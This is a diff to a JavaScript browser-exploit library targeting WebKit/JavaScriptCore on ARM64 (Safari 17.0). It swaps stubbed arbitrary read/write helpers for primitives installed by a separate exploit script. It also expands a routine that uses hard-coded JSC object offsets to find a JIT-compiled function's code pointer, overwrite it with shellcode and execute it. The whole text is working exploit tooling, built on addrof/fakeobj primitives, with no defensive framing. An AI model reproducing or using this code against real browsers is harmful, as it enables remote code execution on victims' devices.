@@ -108,162 +108,84 @@ function registerPrimitives(addrofFn, fakeobjFn) {
 }
 
 
-// --- Arbitrary R/W via fake JSArray ---
+// --- Arbitrary R/W ---
+// The SC exploit (sc-exploit.js) installs window.rw directly from the
+// corrupted Uint8Array memory window. These helpers bridge old callsites.
 
-var arw = null;
-
-function setupArbitraryRW() {
-  // Allocate a victim Float64Array whose butterfly we'll redirect
-  var victim = new Float64Array(4);
-  var victimAddr = addrof(victim);
-
-  // Read JSC structure ID from a known-good array
-  var probe = [1.1, 2.2, 3.3, 4.4];
-  var probeAddr = addrof(probe);
-
-  // JSArray in JSC has: [structureID + flags] [butterfly pointer]
-  // Butterfly points to: [length (8 bytes)] [elements...]
-  // We'll create a fake JSArray header that uses an attacker-controlled butterfly
-
-  var fakeArrayBuf = new ArrayBuffer(0x100);
-  var fakeArrayDV = new DataView(fakeArrayBuf);
-  var fakeArrayU8 = new Uint8Array(fakeArrayBuf);
-  var fakeArrayAddr = addrof(fakeArrayBuf);
-
-  // The backing store of an ArrayBuffer is at a fixed offset from the object
-  // For JSC on ARM64 with WebKit 613.0, this is typically +0x10 from cell start
-  // (The exact offset depends on the JSC version)
-  var backingStoreOffset = 0x10;
-
-  // Get the inline storage address of our fake array buffer
-  var inlineAddr = fakeArrayAddr.add(backingStoreOffset);
-
-  arw = {
-    fakeArrayBuf: fakeArrayBuf,
-    fakeArrayDV: fakeArrayDV,
-    fakeArrayAddr: fakeArrayAddr,
-    inlineAddr: inlineAddr,
-    victim: victim,
-    victimAddr: victimAddr,
-
-    // Read 8 bytes at an arbitrary address
-    read64: function(addr) {
-      // Point the victim's data pointer at addr
-      // For Float64Array: backingStore is at offset 0x10 from the TypedArray cell
-      // This is a simplified version - real implementation needs JSC internals
-      throw new Error('read64 requires calibrated offsets for this WebKit build');
-    },
-
-    // Write 8 bytes at an arbitrary address
-    write64: function(addr, value) {
-      throw new Error('write64 requires calibrated offsets for this WebKit build');
-    }
-  };
-
-  return arw;
-}
-
-// Simpler R/W approach using DataView backing store overwrite
-function setupDataViewRW() {
-  var dv = new DataView(new ArrayBuffer(0x1000));
-  var dvAddr = addrof(dv);
-
-  // In JSC, DataView stores its backing pointer at a fixed offset
-  // By overwriting this pointer, we redirect all DataView reads/writes
-  var backingPtrOffset = 0x10;  // calibrate for WebKit 613.0
-
-  return {
-    _dv: dv,
-    _dvAddr: dvAddr,
-    _origBacking: null,  // save original to restore
-
-    setTarget: function(addr) {
-      // Overwrite the DataView's m_vector (backing store pointer)
-      // This requires a separate write primitive (e.g., via fakeobj butterfly)
-      throw new Error('setTarget needs initial write primitive');
-    },
-
-    read32: function(addr) {
-      this.setTarget(new Int64(addr));
-      return this._dv.getUint32(0, true);
-    },
-
-    read64: function(addr) {
-      this.setTarget(new Int64(addr));
-      return new Int64(this._dv.getBigUint64(0, true));
-    },
-
-    write32: function(addr, val) {
-      this.setTarget(new Int64(addr));
-      this._dv.setUint32(0, val, true);
-    },
-
-    write64: function(addr, val) {
-      this.setTarget(new Int64(addr));
-      this._dv.setBigUint64(0, new Int64(val).n, true);
-    },
-
-    readBytes: function(addr, length) {
-      this.setTarget(new Int64(addr));
-      var result = new Uint8Array(length);
-      for (var i = 0; i < length; i++) {
-        result[i] = this._dv.getUint8(i);
-      }
-      return result;
-    },
-
-    writeBytes: function(addr, bytes) {
-      this.setTarget(new Int64(addr));
-      for (var i = 0; i < bytes.length; i++) {
-        this._dv.setUint8(i, bytes[i]);
-      }
-    }
-  };
+function getInstalledRW() {
+  if (typeof window !== 'undefined' && window.rw) return window.rw;
+  throw new Error('No R/W primitives installed — run sc-exploit first');
 }
 
 
 // --- ARM64 shellcode execution ---
 
-// JIT spray / code execution via JIT-compiled function
-// On ARM64 without PAC for data pointers, we can:
-// 1. Overwrite a JIT-compiled function's code pointer
-// 2. Place shellcode in a known RWX region
-// 3. Jump to it
+// On ARM64 without PAC (Cortex-A78AE), we overwrite a JIT-compiled
+// function's entry point and call it to run our shellcode.
+// JSC on ARM64 uses RWX JIT pages when WASM isn't separated.
 
 function executeShellcode(shellcodeBytes, rw) {
   if (!rw || !rw.read64 || !rw.write64) {
-    throw new Error('Need arbitrary R/W primitive');
+    throw new Error('Need arbitrary R/W primitive (read64/write64/writeBytes)');
   }
 
-  // Strategy: find a JIT-compiled function, overwrite its entry point
-  // JSC compiles hot functions to native code in RWX pages
-
-  // Step 1: Create a function and force JIT compilation
+  // Step 1: Create and JIT-compile a function
   function jitTarget(x) {
     var sum = 0;
     for (var i = 0; i < 100; i++) sum += x + i;
     return sum;
   }
-
-  // Warm up the JIT
   for (var i = 0; i < 10000; i++) jitTarget(i);
 
-  // Step 2: Find the JIT code pointer
   var funcAddr = addrof(jitTarget);
 
-  // JSFunction -> m_executable (offset 0x18 from cell start in JSC)
+  // Step 2: Walk the JSC object chain to find the JIT code pointer
+  // JSFunction layout (ARM64, WebKit 613.0):
+  //   +0x00: JSCell header
+  //   +0x08: butterfly
+  //   +0x10: scope
+  //   +0x18: executable (FunctionExecutable*)
   var executableAddr = rw.read64(funcAddr.add(0x18));
+  if (!executableAddr || executableAddr.eq(0))
+    throw new Error('Could not read executable pointer at funcAddr+0x18');
 
-  // ExecutableBase -> m_jitCodeFor* has the compiled code address
-  // The exact offset depends on the JSC version
-  // For DFG/FTL compiled code:
-  var jitCodeOffset = 0x28;  // calibrate for WebKit 613.0
-  var codeAddr = rw.read64(executableAddr.add(jitCodeOffset));
+  // FunctionExecutable -> m_jitCodeForCall (CodeBlock* or DirectJITCode)
+  // Probe known offsets for WebKit 613.0 (Safari 17.0)
+  var jitCodeOffsets = [0x28, 0x30, 0x38, 0x20];
+  var codeAddr = null;
+  for (var j = 0; j < jitCodeOffsets.length; j++) {
+    var candidate = rw.read64(executableAddr.add(jitCodeOffsets[j]));
+    if (candidate && !candidate.eq(0)) {
+      // JIT code pointers on ARM64 are typically in high memory (RWX region)
+      var val = candidate.toNumber();
+      if (val > 0x100000000 && val < 0x0000FFFFFFFFFFFF) {
+        codeAddr = candidate;
+        break;
+      }
+    }
+  }
 
-  // Step 3: Write shellcode over the JIT code
+  if (!codeAddr) {
+    // Fallback: read through CodeBlock to get the JIT code
+    // CodeBlock is at ExecutableBase+0x10 in some builds
+    var codeBlock = rw.read64(executableAddr.add(0x10));
+    if (codeBlock && !codeBlock.eq(0)) {
+      // CodeBlock -> m_jitCode (JITCode*) at +0x28 or +0x30
+      var jitCode = rw.read64(codeBlock.add(0x28));
+      if (jitCode && !jitCode.eq(0)) {
+        // JITCode -> m_executableAddress at +0x10
+        codeAddr = rw.read64(jitCode.add(0x10));
+      }
+    }
+  }
+
+  if (!codeAddr || codeAddr.eq(0))
+    throw new Error('Could not locate JIT code address — offsets may need calibration');
+
+  // Step 3: Write shellcode into the JIT region
   rw.writeBytes(codeAddr, shellcodeBytes);
 
-  // Step 4: Call the function to execute shellcode
+  // Step 4: Execute by calling the JIT'd function
   return jitTarget(0);
 }
 
@@ -279,8 +201,7 @@ if (typeof window !== 'undefined') {
   window.addrof = addrof;
   window.fakeobj = fakeobj;
   window.registerPrimitives = registerPrimitives;
-  window.setupArbitraryRW = setupArbitraryRW;
-  window.setupDataViewRW = setupDataViewRW;
+  window.getInstalledRW = getInstalledRW;
   window.executeShellcode = executeShellcode;
   window.DOUBLE_ENCODE_OFFSET = DOUBLE_ENCODE_OFFSET;
 }
@@ -291,6 +212,8 @@ return {
   encodePtr: encodePtr, decodePtr: decodePtr,
   addrof: addrof, fakeobj: fakeobj,
   registerPrimitives: registerPrimitives,
+  getInstalledRW: getInstalledRW,
+  executeShellcode: executeShellcode,
   DOUBLE_ENCODE_OFFSET: DOUBLE_ENCODE_OFFSET
 };
 })();
